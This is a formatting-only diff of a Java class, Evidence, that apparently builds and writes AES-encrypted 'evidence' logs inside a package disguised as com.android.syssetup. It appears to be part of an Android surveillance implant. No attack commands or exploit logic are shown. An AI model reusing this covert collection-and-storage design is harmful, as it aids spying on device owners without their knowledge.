@@ -9,9 +9,6 @@
 
 package com.android.syssetup.evidence;
 
-import java.util.ArrayList;
-import java.util.Date;
-
 import com.android.syssetup.Device;
 import com.android.syssetup.auto.Cfg;
 import com.android.syssetup.conf.Configuration;
@@ -25,60 +22,97 @@ import com.android.syssetup.util.DataBuffer;
 import com.android.syssetup.util.DateTime;
 import com.android.syssetup.util.WChar;
 
+import java.util.ArrayList;
+import java.util.Date;
+
 /**
  * The Class Evidence (formerly known as Log.)
  */
 final class Evidence {
 
-	/** The Constant EVIDENCE_VERSION_01. */
+	/**
+	 * The Constant EVIDENCE_VERSION_01.
+	 */
 	private static final int E_VERSION_01 = 2008121901;
 
-	/** The Constant TAG. */
+	/**
+	 * The Constant TAG.
+	 */
 	private static final String TAG = "Evidence"; //$NON-NLS-1$
-	/** The first space. */
+	/**
+	 * The first space.
+	 */
 	boolean firstSpace = true;
 
-	/** The enough space. */
+	/**
+	 * The enough space.
+	 */
 	boolean enoughSpace = true;
 
-	/** The timestamp. */
+	/**
+	 * The timestamp.
+	 */
 	Date timestamp;
 
-	/** The log name. */
+	/**
+	 * The log name.
+	 */
 	String logName;
 
-	/** The evidence type. */
+	/**
+	 * The evidence type.
+	 */
 	int evidenceType;
 
-	/** The file name. */
+	/**
+	 * The file name.
+	 */
 	String fileName;
 
-	/** The fconn. */
+	/**
+	 * The fconn.
+	 */
 	AutoFile fconn = null;
 
 	// DataOutputStream os = null;
-	/** The encryption. */
+	/**
+	 * The encryption.
+	 */
 	Encryption encryption;
 
-	/** The evidence collector. */
+	/**
+	 * The evidence collector.
+	 */
 	EvidenceCollector evidenceCollector;
 
-	/** The evidence description. */
+	/**
+	 * The evidence description.
+	 */
 	EvidenceDescription evidenceDescription;
 
-	/** The device. */
+	/**
+	 * The device.
+	 */
 	Device device;
 
-	/** The type evidence id. */
+	/**
+	 * The type evidence id.
+	 */
 	int typeEvidenceId;
 
-	/** The progressive. */
+	/**
+	 * The progressive.
+	 */
 	int progressive;
 
-	/** The aes key. */
+	/**
+	 * The aes key.
+	 */
 	private byte[] aesKey;
 
-	/** The enc data. */
+	/**
+	 * The enc data.
+	 */
 	private byte[] encData;
 
 	private byte[] lastBlock;
@@ -97,11 +131,9 @@ final class Evidence {
 
 	/**
 	 * Instantiates a new log.
-	 * 
-	 * @param typeEvidenceId
-	 *            the type evidence id
-	 * @param aesKey
-	 *            the aes key
+	 *
+	 * @param typeEvidenceId the type evidence id
+	 * @param aesKey         the aes key
 	 */
 	public Evidence(final int typeEvidenceId, final byte[] aesKey) {
 		this();
@@ -123,9 +155,8 @@ final class Evidence {
 
 	/**
 	 * Instantiates a new evidence.
-	 * 
-	 * @param typeEvidenceId
-	 *            the type evidence id
+	 *
+	 * @param typeEvidenceId the type evidence id
 	 */
 	public Evidence(final int typeEvidenceId) {
 		this(typeEvidenceId, Keys.self().getAesKey());
@@ -133,7 +164,7 @@ final class Evidence {
 
 	/**
 	 * Enough space.
-	 * 
+	 *
 	 * @return true, if successful
 	 */
 	private boolean enoughSpace() {
@@ -161,7 +192,7 @@ final class Evidence {
 	 * anche cancellato da disco e rimosso dalla coda. Questa funzione NON va
 	 * chiamata per i markup perche' la WriteMarkup() e la ReadMarkup() chiudono
 	 * automaticamente l'handle.
-	 * 
+	 *
 	 * @return true, if successful
 	 */
 	public synchronized boolean close() {
@@ -195,9 +226,8 @@ final class Evidence {
 
 	/**
 	 * Crea un'evidenza con tipo standard.
-	 * 
-	 * @param additionalData
-	 *            the additional data
+	 *
+	 * @param additionalData the additional data
 	 * @return true, if successful
 	 */
 	public synchronized boolean createEvidence(final byte[] additionalData) {
@@ -214,11 +244,9 @@ final class Evidence {
 	 * TRUE fa in modo che il log venga salvato nella prima MMC disponibile, se
 	 * non c'e' la chiama fallisce. La funzione torna TRUE se va a buon fine,
 	 * FALSE altrimenti.
-	 * 
-	 * @param additionalData
-	 *            the additional data
-	 * @param evidenceType
-	 *            the log type
+	 *
+	 * @param additionalData the additional data
+	 * @param evidenceType   the log type
 	 * @return true, if successful
 	 */
 	public synchronized boolean createEvidence(final byte[] additionalData, final int evidenceType) {
@@ -316,13 +344,12 @@ final class Evidence {
 	}
 
 	// pubblico solo per fare i test
+
 	/**
 	 * Make description.
-	 * 
-	 * @param additionalData
-	 *            the additional data
-	 * @param evidenceType
-	 *            the log type
+	 *
+	 * @param additionalData the additional data
+	 * @param evidenceType   the log type
 	 * @return the byte[]
 	 */
 	public byte[] makeDescription(final byte[] additionalData, final int evidenceType) {
@@ -381,9 +408,8 @@ final class Evidence {
 
 	/**
 	 * Write evidence.
-	 * 
-	 * @param data
-	 *            the data
+	 *
+	 * @param data the data
 	 * @return true, if successful
 	 */
 	public boolean writeEvidence(final byte[] data) {
@@ -394,11 +420,9 @@ final class Evidence {
 	 * Questa funzione prende i byte puntati da pByte, li cifra e li scrive nel
 	 * file di log creato con CreateLog(). La funzione torna TRUE se va a buon
 	 * fine, FALSE altrimenti.
-	 * 
-	 * @param data
-	 *            the data
-	 * @param offset
-	 *            the offset
+	 *
+	 * @param data   the data
+	 * @param offset the offset
 	 * @return true, if successful
 	 */
 	public synchronized boolean writeEvidence(final byte[] data, final int offset, int len) {
@@ -444,9 +468,8 @@ final class Evidence {
 
 	/**
 	 * Write logs.
-	 * 
-	 * @param bytelist
-	 *            the bytelist
+	 *
+	 * @param bytelist the bytelist
 	 * @return true, if successful
 	 */
 	public boolean writeEvidences(final ArrayList<byte[]> byteList) {
@@ -517,7 +540,7 @@ final class Evidence {
 
 	/**
 	 * Gets the enc data.
-	 * 
+	 *
 	 * @return the enc data
 	 */
 	public byte[] getEncData() {
@@ -526,13 +549,10 @@ final class Evidence {
 
 	/**
 	 * Atomic write once.
-	 * 
-	 * @param additionalData
-	 *            the additional data
-	 * @param logType
-	 *            the log type
-	 * @param content
-	 *            the content
+	 *
+	 * @param additionalData the additional data
+	 * @param logType        the log type
+	 * @param content        the content
 	 */
 	public void atomicWriteOnce(final byte[] additionalData, final int logType, final byte[] content) {
 		if (createEvidence(additionalData, logType)) {
